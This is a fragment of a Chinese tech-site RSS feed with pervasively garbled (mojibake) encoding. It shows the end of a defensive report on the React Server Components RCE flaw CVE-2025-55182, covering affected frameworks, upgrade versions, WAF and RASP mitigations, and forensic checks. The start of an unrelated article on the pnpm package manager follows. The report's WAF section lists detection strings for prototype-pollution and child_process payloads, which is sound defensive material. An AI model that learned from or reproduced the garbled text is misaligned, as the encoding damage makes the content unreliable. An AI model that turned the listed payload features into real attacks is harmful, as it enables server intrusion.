<h3 data-id="heading-14">5.3 å…¶ä»–å—å½±å“æ¡†æ¶</h3>
<p>é™¤äº† Next.jsï¼Œå‡¡æ˜¯ä¾èµ– RSC å®ç°çš„æ¡†æ¶å‡åœ¨æ‰“å‡»èŒƒå›´å†…ï¼š</p>
<ul>
<li><strong>React Routerï¼š</strong> è‹¥ä½¿ç”¨äº†å®éªŒæ€§çš„ RSC APIï¼Œåˆ™å—å½±å“ã€‚</li>
<li><strong>Wakuï¼š</strong> æ‰€æœ‰ v0.27.2 ä¹‹å‰çš„ç‰ˆæœ¬ã€‚</li>
<li><strong>RedwoodJSï¼š</strong> ä½¿ç”¨ RSC åŠŸèƒ½çš„ç‰ˆæœ¬ã€‚</li>
<li><strong>Vite / Parcel æ’ä»¶ï¼š</strong> ä½¿ç”¨äº† <code>@vitejs/plugin-rsc</code> æˆ– <code>@parcel/rsc</code> çš„é¡¹ç›®ã€‚</li>
<li><strong>Shopify Hydrogenï¼š</strong> ä½œä¸ºåŸºäº React çš„ç”µå•†æ¡†æ¶ï¼Œå¦‚æœå…¶åº•å±‚ä¾èµ–äº†ä¸Šè¿°å—å½±å“çš„ React ç‰ˆæœ¬ï¼ŒåŒæ ·é¢ä¸´é£é™©ã€‚</li>
</ul>
<h2 data-id="heading-15">6. å…¨é“¾è·¯ä¿®å¤ä¸é˜²å¾¡æŒ‡å—</h2>
<p>é¢å¯¹å¦‚æ­¤é«˜å±çš„æ¼æ´ï¼Œä¼ä¸šå®‰å…¨å›¢é˜Ÿå¿…é¡»é‡‡å–è¿…é€Ÿä¸”æœæ–­çš„è¡ŒåŠ¨ã€‚ä¿®å¤å·¥ä½œä¸èƒ½ä»…åœç•™åœ¨â€œæ‰“è¡¥ä¸â€å±‚é¢ï¼Œè€Œåº”æ„å»ºçºµæ·±é˜²å¾¡ä½“ç³»ã€‚</p>
<h3 data-id="heading-16">6.1 æ ¸å¿ƒä¿®å¤ç­–ç•¥ï¼šç‰ˆæœ¬å‡çº§</h3>
<p>è¿™æ˜¯æ¶ˆé™¤æ¼æ´çš„å”¯ä¸€æ ¹æœ¬é€”å¾„ã€‚è¯·åŠ¡å¿…æ ¹æ®æ‚¨çš„æŠ€æœ¯æ ˆé€‰æ‹©æ­£ç¡®çš„å‡çº§è·¯å¾„ã€‚</p>
<h4 data-id="heading-17">6.1.1 Next.js å‡çº§æŒ‡å—</h4>
<p>å¼€å‘è€…åº”ç«‹å³æ£€æŸ¥ <code>package.json</code> å¹¶å°† <code>next</code> ä¾èµ–å‡çº§åˆ°ä»¥ä¸‹å®‰å…¨ç‰ˆæœ¬ï¼ˆæˆ–æ›´é«˜ï¼‰ï¼š</p>













































<table><thead><tr><th align="left">ç‰ˆæœ¬çº¿</th><th align="left">æœ€ä½å®‰å…¨ç‰ˆæœ¬</th><th align="left">å‡çº§å‘½ä»¤</th></tr></thead><tbody><tr><td align="left">v15.0.x</td><td align="left"><strong>15.0.5</strong></td><td align="left"><code>npm install next@15.0.5</code></td></tr><tr><td align="left">v15.1.x</td><td align="left"><strong>15.1.9</strong></td><td align="left"><code>npm install next@15.1.9</code></td></tr><tr><td align="left">v15.2.x</td><td align="left"><strong>15.2.6</strong></td><td align="left"><code>npm install next@15.2.6</code></td></tr><tr><td align="left">v15.3.x</td><td align="left"><strong>15.3.6</strong></td><td align="left"><code>npm install next@15.3.6</code></td></tr><tr><td align="left">v15.4.x</td><td align="left"><strong>15.4.8</strong></td><td align="left"><code>npm install next@15.4.8</code></td></tr><tr><td align="left">v15.5.x</td><td align="left"><strong>15.5.7</strong></td><td align="left"><code>npm install next@15.5.7</code></td></tr><tr><td align="left">v16.0.x</td><td align="left"><strong>16.0.7</strong></td><td align="left"><code>npm install next@16.0.7</code></td></tr></tbody></table>
<p>å¯¹äºä½¿ç”¨ Canary ç‰ˆæœ¬çš„ç”¨æˆ·ï¼Œå»ºè®®<strong>é™çº§</strong>å› Next.js 14 ç¨³å®šç‰ˆï¼Œé™¤éæœ‰ç‰¹å®šçš„ Canary ä¿®å¤ç‰ˆæœ¬å¯ç”¨ï¼ˆå¦‚ 15.6.0-canary.58 æˆ– 16.1.0-canary.12ï¼‰ã€‚</p>
<p><strong>å…³é”®æ“ä½œæç¤ºï¼š</strong> å‡çº§ä¾èµ–åï¼Œå¿…é¡»æ‰§è¡Œ<strong>å®Œå…¨é‡æ–°æ„å»º</strong>å¹¶<strong>é‡æ–°éƒ¨ç½²</strong>æ•´ä¸ªåº”ç”¨ã€‚ä»…ä¿®æ”¹ <code>package.json</code> å’Œ <code>node_modules</code> æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸º Next.js çš„æ„å»ºäº§ç‰©ä¸­å¯èƒ½å†…è”äº†æ—§ç‰ˆçš„æ¼æ´ä»£ç ã€‚</p>
<h4 data-id="heading-18">6.1.2 React 19 (ç‹¬ç«‹ä½¿ç”¨) å‡çº§æŒ‡å—</h4>
<p>å¦‚æœæ‚¨çš„é¡¹ç›®ç›´æ¥ä¾èµ– React 19 è€Œéé€šè¿‡æ¡†æ¶ï¼Œè¯·å‡çº§ä»¥ä¸‹åŒ…è‡³å®‰å…¨ç‰ˆæœ¬ï¼š</p>
<ul>
<li><strong>å®‰å…¨ç‰ˆæœ¬ï¼š</strong> 19.0.1, 19.1.2, 19.2.1</li>
<li><strong>æ‰§è¡Œå‘½ä»¤ï¼š</strong>
<pre><code class="hljs language-bash" lang="bash">npm install react@latest react-dom@latest react-server-dom-webpack@latest
</code></pre>
<em>ï¼ˆè‹¥ä½¿ç”¨ Parcel æˆ– Turbopackï¼Œè¯·æ›¿æ¢å¯¹åº”çš„ <code>react-server-dom-*</code> åŒ…åï¼‰</em></li>
</ul>
<h4 data-id="heading-19">6.1.3 Waku ä¸ RedwoodJS å‡çº§</h4>
<ul>
<li><strong>Wakuï¼š</strong> å‡çº§è‡³ v0.27.2 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œå¹¶ç¡®ä¿é€šè¿‡ <code>overrides</code> æˆ– <code>resolutions</code> å¼ºåˆ¶æ›´æ–°å†…éƒ¨çš„ React ä¾èµ–ã€‚</li>
<li><strong>RedwoodJSï¼š</strong> å‡çº§è‡³æœ€æ–°çš„è¡¥ä¸ç‰ˆæœ¬ï¼Œç¡®ä¿ <code>rwsdk</code> ç‰ˆæœ¬ &gt;= 1.0.0-alpha.0ã€‚</li>
</ul>
<h3 data-id="heading-20">6.2 ä¸´æ—¶ç¼“è§£ä¸è¾¹ç•Œé˜²å¾¡</h3>
<p>åœ¨æ— æ³•ç«‹å³å®Œæˆä»£ç å‡çº§å’Œéƒ¨ç½²çš„çª—å£æœŸï¼Œå¿…é¡»åœ¨ç½‘ç»œè¾¹ç•Œå®æ–½æ‹¦æˆªã€‚</p>
<h4 data-id="heading-21">6.2.1 Web åº”ç”¨é˜²ç«å¢™ (WAF) ç­–ç•¥</h4>
<ul>
<li><strong>AWS WAFï¼š</strong> å¯ç”¨ <code>AWSManagedRulesKnownBadInputsRuleSet</code> æ‰˜ç®¡è§„åˆ™é›†ï¼ˆç¡®ä¿ç‰ˆæœ¬ä¸º 1.24 æˆ–æ›´é«˜ï¼‰ã€‚AWS å·²é’ˆå¯¹æ­¤æ¼æ´æ›´æ–°äº†è§„åˆ™ï¼Œèƒ½å¤Ÿè¯†åˆ«æ¶æ„çš„ Flight åè®® Payloadã€‚</li>
<li><strong>F5 BIG-IP / NGINXï¼š</strong> F5 å·²å‘å¸ƒæ”»å‡»ç­¾å ID <code>200204048</code>ï¼ˆReact Server Components RCEï¼‰ã€‚è¯·ç¡®ä¿ ASM æ”»å‡»ç­¾ååº“å·²æ›´æ–°è‡³ <code>20251204_021602</code> æˆ–æ›´é«˜ï¼Œå¹¶å°†è¯¥ç­¾åè®¾ä¸ºâ€œé˜»æ–­â€æ¨¡å¼ã€‚</li>
<li><strong>Cloudflare / Vercel WAFï¼š</strong> è¿™äº›å¹³å°å·²è‡ªåŠ¨éƒ¨ç½²äº†é’ˆå¯¹ CVE-2025-55182 çš„è§„åˆ™ï¼Œä¸ºæ‰˜ç®¡åœ¨å…¶ä¸Šçš„åº”ç”¨æä¾›é»˜è®¤ä¿æŠ¤ã€‚</li>
<li><strong>è‡ªå®šä¹‰è§„åˆ™å»ºè®®ï¼š</strong> å¦‚æœä½¿ç”¨è‡ªå»º WAFï¼ˆå¦‚ ModSecurityï¼‰ï¼Œåº”é‡ç‚¹æ£€æµ‹è¯·æ±‚ä½“ä¸­æ˜¯å¦åŒ…å«ä»¥ä¸‹ç‰¹å¾å­—ç¬¦ä¸²ï¼š
<ul>
<li><code>$1:constructor</code></li>
<li><code>$1:__proto__</code></li>
<li><code>process.mainModule</code></li>
<li><code>child_process</code></li>
</ul>
</li>
</ul>
<h4 data-id="heading-22">6.2.2 è¿è¡Œæ—¶åº”ç”¨é˜²æŠ¤</h4>
<ul>
<li><strong>ç¦ç”¨ Server Actionsï¼š</strong> è™½ç„¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œä½†åœ¨ <code>next.config.js</code> ä¸­ç¦ç”¨ Server Actions å¯ä»¥å‡å°‘æ”»å‡»é¢ã€‚ä½†è¯·æ³¨æ„ï¼Œåªè¦ RSC åŠŸèƒ½å¼€å¯ï¼Œé£é™©ä¾ç„¶å­˜åœ¨ã€‚</li>
<li><strong>RASPï¼ˆRuntime Application Self-Protectionï¼‰ï¼š</strong> éƒ¨ç½² RASP è§£å†³æ–¹æ¡ˆå¯ä»¥ç›‘æ§ Node.js è¿›ç¨‹çš„è¡Œä¸ºã€‚é…ç½®ç­–ç•¥ä»¥ç¦æ­¢ Web è¿›ç¨‹æ´¾ç”Ÿ Shellï¼ˆå¦‚ <code>/bin/sh</code>, <code>cmd.exe</code>ï¼‰æˆ–å‘èµ·å¼‚å¸¸çš„ç½‘ç»œè¿æ¥ã€‚</li>
</ul>
<h3 data-id="heading-23">6.3 è°ƒæŸ¥ä¸å–è¯</h3>
<p>ä¿®å¤æ¼æ´åï¼Œå¿…é¡»å‡è®¾ç³»ç»Ÿå¯èƒ½å·²è¢«å…¥ä¾µï¼Œå¹¶è¿›è¡Œå½»åº•æ’æŸ¥ã€‚</p>
<ol>
<li><strong>æ—¥å¿—å®¡è®¡ï¼š</strong> æ£€æŸ¥ Web è®¿é—®æ—¥å¿—ï¼Œå¯»æ‰¾ HTTP 500 é”™è¯¯å³°å€¼ï¼Œä»¥åŠæ¥è‡ªæœªçŸ¥ IP çš„å¼‚å¸¸ POST è¯·æ±‚ã€‚é‡ç‚¹å…³æ³¨è¯·æ±‚ä½“ä¸­åŒ…å« JSON ç‰¹æ®Šå­—ç¬¦æˆ– Flight åè®®æ ‡è®°çš„è¯·æ±‚ã€‚</li>
<li><strong>æ–‡ä»¶ç³»ç»Ÿå®Œæ•´æ€§æ£€æŸ¥ï¼š</strong> æ‰«ææœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿï¼Œç‰¹åˆ«æ˜¯ <code>/tmp</code>ã€<code>/var/tmp</code> å’Œåº”ç”¨æ ¹ç›®å½•ï¼ŒæŸ¥æ‰¾è¿‘æœŸåˆ›å»ºçš„å¯ç–‘è„šæœ¬ã€WebShell æˆ–æ ‡è®°æ–‡ä»¶ï¼ˆå¦‚ <code>pwned.txt</code>ï¼‰ã€‚</li>
<li><strong>è¿›ç¨‹ç›‘æ§ï¼š</strong> æ£€æŸ¥æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ ‘ã€‚æ­£å¸¸çš„ Node.js åº”ç”¨ä¸åº”ä½œä¸ºçˆ¶è¿›ç¨‹å¯åŠ¨ <code>curl</code>ã€<code>wget</code>ã€<code>python</code> æˆ–åŠ å¯†è´§å¸æŒ–çŸ¿ç¨‹åºã€‚</li>
<li><strong>äº‘ç¯å¢ƒå®¡è®¡ï¼š</strong> å¦‚æœåº”ç”¨éƒ¨ç½²åœ¨ AWS/Azure/GCP ä¸Šï¼Œæ£€æŸ¥ CloudTrail æˆ–å®¡è®¡æ—¥å¿—ï¼Œç¡®è®¤æ˜¯å¦æœ‰å¼‚å¸¸çš„ IAM è§’è‰²è°ƒç”¨ã€å…ƒæ•°æ®æœåŠ¡è®¿é—®è®°å½•æˆ–æœªæˆæƒçš„èµ„æºåˆ›å»ºè¡Œä¸ºã€‚</li>
</ol>
<h2 data-id="heading-24">7. ç»“è®ºä¸æœªæ¥å±•æœ›</h2>
<p>CVE-2025-55182 "React2Shell" çš„çˆ†å‘å†æ¬¡æé†’æˆ‘ä»¬ï¼Œè½¯ä»¶ä¾›åº”é“¾å®‰å…¨ä¸ä»…å…³ä¹ç¬¬ä¸‰æ–¹åº“çš„æ¼æ´ï¼Œæ›´å…³ä¹æ ¸å¿ƒæ¶æ„è®¾è®¡çš„å®‰å…¨æ€§ã€‚React Server Components æ¨¡ç³Šäº†å‰åç«¯çš„è¾¹ç•Œï¼Œè™½ç„¶å¸¦æ¥äº†å¼€å‘æ•ˆç‡å’Œæ€§èƒ½çš„æå‡ï¼Œä½†ä¹Ÿå¼•å…¥äº†æ›´ä¸ºå¤æ‚çš„æ”»å‡»é¢ã€‚</p>
<p>å¯¹äºä¼ä¸šè€Œè¨€ï¼Œæ­¤æ¬¡äº‹ä»¶ä¸ä»…æ˜¯ä¸€æ¬¡å®‰å…¨åº”æ€¥å“åº”çš„è€ƒéªŒï¼Œæ›´æ˜¯å¯¹ç°æœ‰ DevSecOps æµç¨‹çš„æ£€éªŒã€‚èƒ½å¤Ÿå¿«é€Ÿç”Ÿæˆå‡†ç¡®çš„ SBOMï¼ˆè½¯ä»¶ç‰©æ–™æ¸…å•ï¼‰ã€æ‹¥æœ‰è‡ªåŠ¨åŒ–ä¾èµ–æ›´æ–°æœºåˆ¶ä»¥åŠéƒ¨ç½²äº†å¤šå±‚çºµæ·±é˜²å¾¡ä½“ç³»çš„ä¼ä¸šï¼Œæ‰èƒ½åœ¨é¢å¯¹æ­¤ç±» "æ ¸å¼¹çº§" æ¼æ´æ—¶ä»å®¹åº”å¯¹ã€‚</p>
<p>å»ºè®®æ‰€æœ‰ç›¸å…³æ–¹ç«‹å³æ‰§è¡Œæœ¬æŠ¥å‘Šä¸­çš„ä¿®å¤æ–¹æ¡ˆï¼Œå¹¶æŒç»­å…³æ³¨ React ä¸ Next.js å›¢é˜Ÿå‘å¸ƒçš„åç»­å®‰å…¨å…¬å‘Šï¼Œä»¥é˜²å¾¡å¯èƒ½å‡ºç°çš„å˜ç§æ”»å‡»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[pnpm æ˜¯ä»€ä¹ˆï¼Œçœ‹è¿™ç¯‡æ–‡ç« å°±å¤Ÿäº†]]></title>    <link>https://juejin.cn/post/7580740782932672554</link>    <guid>https://juejin.cn/post/7580740782932672554</guid>    <pubDate>2025-12-08T02:59:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782932672554" data-draft-id="7580723992498077732" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="pnpm æ˜¯ä»€ä¹ˆï¼Œçœ‹è¿™ç¯‡æ–‡ç« å°±å¤Ÿäº†"/> <meta itemprop="keywords" content="JavaScript,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T02:59:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AndyGoWei"/> <meta itemprop="url" content="https://juejin.cn/user/4080985785246541"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            pnpm æ˜¯ä»€ä¹ˆï¼Œçœ‹è¿™ç¯‡æ–‡ç« å°±å¤Ÿäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4080985785246541/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AndyGoWei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:59:35.000Z" title="Mon Dec 08 2025 02:59:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€pnpm æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>pnpmï¼ˆPerformant NPMï¼‰æ˜¯ç”± Zoltan Kochan å¼€å‘çš„<strong>é«˜æ€§èƒ½ Node.js åŒ…ç®¡ç†å™¨</strong>ï¼Œæ ¸å¿ƒå®šä½æ˜¯è§£å†³ npm/yarn å­˜åœ¨çš„ç£ç›˜ç©ºé—´å ç”¨é«˜ã€å®‰è£…é€Ÿåº¦æ…¢ã€ä¾èµ–åµŒå¥—è¿‡æ·±ç­‰é—®é¢˜ï¼ŒåŒæ—¶å…¼å®¹ npm çš„å¤§éƒ¨åˆ†åŠŸèƒ½å’Œç”Ÿæ€ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼špnpm = æè‡´çš„ç£ç›˜åˆ©ç”¨ç‡ + è¶…å¿«çš„å®‰è£…é€Ÿåº¦ + ä¸¥æ ¼çš„ä¾èµ–ç®¡ç†ã€‚</p>
<h3 data-id="heading-1">äºŒã€æ ¸å¿ƒä¼˜åŠ¿ï¼ˆå¯¹æ¯” npm/yarnï¼‰</h3>
<h4 data-id="heading-2">1. æè‡´çš„ç£ç›˜ç©ºé—´åˆ©ç”¨ç‡</h4>
<ul>
<li>
<p><strong>ç¡¬é“¾æ¥ + ç¬¦å·é“¾æ¥ï¼ˆSymlinkï¼‰æœºåˆ¶</strong>ï¼špnpm ä¼šåœ¨å…¨å±€ç›®å½•ï¼ˆé»˜è®¤Â <code>~/.pnpm-store</code>ï¼‰ä¸­å­˜å‚¨æ‰€æœ‰å®‰è£…è¿‡çš„åŒ…çš„<strong>å•ä¸€å‰¯æœ¬</strong>ï¼Œåç»­é¡¹ç›®å®‰è£…ç›¸åŒç‰ˆæœ¬çš„åŒ…æ—¶ï¼Œä¸ä¼šé‡å¤ä¸‹è½½ï¼Œè€Œæ˜¯é€šè¿‡ã€Œç¡¬é“¾æ¥ã€å¤ç”¨å…¨å±€å­˜å‚¨çš„æ–‡ä»¶ï¼Œé€šè¿‡ã€Œç¬¦å·é“¾æ¥ã€æ„å»ºé¡¹ç›®çš„Â <code>node_modules</code>Â ç»“æ„ã€‚</p>
<ul>
<li>å¯¹æ¯”ï¼šnpm/yarn ä¼šåœ¨æ¯ä¸ªé¡¹ç›®çš„Â <code>node_modules</code>Â ä¸­å®Œæ•´å¤åˆ¶ä¾èµ–åŒ…ï¼Œå¤šé¡¹ç›®åœºæ™¯ä¸‹ç£ç›˜å ç”¨å‘ˆå€æ•°å¢é•¿ã€‚</li>
<li>ä¸¾ä¾‹ï¼š10 ä¸ªé¡¹ç›®éƒ½ä¾èµ–Â <code>lodash@4.17.21</code>ï¼Œpnpm ä»…å­˜å‚¨ 1 ä»½ lodash æ–‡ä»¶ï¼Œè€Œ npm/yarn ä¼šå­˜å‚¨ 10 ä»½ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">2. è¶…å¿«çš„å®‰è£…é€Ÿåº¦</h4>
<ul>
<li>å¤ç”¨å…¨å±€ç¼“å­˜å‡å°‘ä¸‹è½½æ¬¡æ•°ï¼›</li>
<li>å¹¶è¡Œå®‰è£…ä¾èµ–ï¼ˆæ¯” npm æ›´æ—©ä¼˜åŒ–å¹¶è¡Œé€»è¾‘ï¼‰ï¼›</li>
<li>æ‰å¹³åŒ–ä¾èµ–ç»“æ„ä½†é¿å…ã€Œå¹½çµä¾èµ–ã€ï¼ˆä¸‹æ–‡è§£é‡Šï¼‰ï¼Œå‡å°‘æ–‡ä»¶ IO å¼€é”€ã€‚</li>
<li>å®æµ‹ï¼šå®‰è£…å¤§å‹é¡¹ç›®ä¾èµ–æ—¶ï¼Œpnpm é€Ÿåº¦é€šå¸¸æ˜¯ npm çš„ 2-5 å€ï¼Œæ¯” yarn classic å¿« 1.5-3 å€ã€‚</li>
</ul>
<h4 data-id="heading-4">3. ä¸¥æ ¼çš„ä¾èµ–ç®¡ç†ï¼ˆé¿å…å¹½çµä¾èµ–ï¼‰</h4>
<ul>
<li>npm/yarn classic çš„Â <code>node_modules</code>Â æ˜¯åµŒå¥— + æ‰å¹³åŒ–æ··åˆç»“æ„ï¼Œå¯èƒ½å¯¼è‡´é¡¹ç›®å¼•ç”¨æœªåœ¨Â <code>package.json</code>Â ä¸­å£°æ˜çš„ä¾èµ–ï¼ˆå¹½çµä¾èµ–ï¼‰ï¼›</li>
<li>pnpm çš„Â <code>node_modules</code>Â æ˜¯<strong>ä¸¥æ ¼çš„ç¬¦å·é“¾æ¥ç»“æ„</strong>ï¼šåªæœ‰åœ¨Â <code>package.json</code>Â ä¸­å£°æ˜çš„ä¾èµ–æ‰ä¼šå‡ºç°åœ¨é¡¹ç›®çš„Â <code>node_modules</code>Â æ ¹ç›®å½•ï¼Œé—´æ¥ä¾èµ–æ— æ³•è¢«ç›´æ¥å¼•ç”¨ï¼Œä»æ ¹æºé¿å…å¹½çµä¾èµ–ï¼Œæå‡é¡¹ç›®å¯ç»´æŠ¤æ€§ã€‚</li>
</ul>
<h4 data-id="heading-5">4. å…¶ä»–ä¼˜åŠ¿</h4>
<ul>
<li>å…¼å®¹ npm å‘½ä»¤ï¼š<code>pnpm install</code>/<code>pnpm add</code>/<code>pnpm run</code>Â ç­‰å‘½ä»¤ä¸ npm åŸºæœ¬ä¸€è‡´ï¼Œå­¦ä¹ æˆæœ¬ä½ï¼›</li>
<li>å†…ç½®å·¥ä½œåŒºï¼ˆmonorepoï¼‰æ”¯æŒï¼šæ— éœ€é¢å¤–é…ç½®ï¼Œå³å¯é«˜æ•ˆç®¡ç†å¤šåŒ…é¡¹ç›®ï¼›</li>
<li>å¯é…ç½®çš„å­˜å‚¨è·¯å¾„ï¼šæ”¯æŒè‡ªå®šä¹‰å…¨å±€åŒ…å­˜å‚¨ç›®å½•ï¼Œé€‚é…ä¸åŒç¯å¢ƒï¼›</li>
<li>é›¶å®‰è£…ï¼ˆoptionalï¼‰ï¼šæ”¯æŒÂ <code>pnpm fetch</code>Â é¢„ä¸‹è½½ä¾èµ–ï¼Œç¦»çº¿ç¯å¢ƒä¹Ÿèƒ½å®‰è£…ã€‚</li>
</ul>
<h3 data-id="heading-6">ä¸‰ã€æ ¸å¿ƒåŸç†ï¼špnpm çš„ node_modules ç»“æ„</h3>
<p>pnpm çš„Â <code>node_modules</code>Â åˆ†ä¸ºä¸¤å±‚ï¼š</p>
<ol>
<li>
<p><strong>å…¨å±€å­˜å‚¨å±‚</strong>ï¼š<code>~/.pnpm-store</code>Â å­˜å‚¨æ‰€æœ‰åŒ…çš„åŸå§‹æ–‡ä»¶ï¼ˆæ¯ä¸ªç‰ˆæœ¬ä»…ä¸€ä»½ï¼‰ï¼›</p>
</li>
<li>
<p><strong>é¡¹ç›®é“¾æ¥å±‚</strong>ï¼š</p>
<ul>
<li>é¡¹ç›®æ ¹ç›®å½•çš„Â <code>node_modules</code>Â ä¸­ï¼Œåªæœ‰Â <code>package.json</code>Â å£°æ˜çš„ä¾èµ–ï¼ˆå¦‚Â <code>react</code>ï¼‰ï¼Œä¸”æ˜¯æŒ‡å‘Â <code>node_modules/.pnpm/react@18.2.0/node_modules/react</code>Â çš„ç¬¦å·é“¾æ¥ï¼›</li>
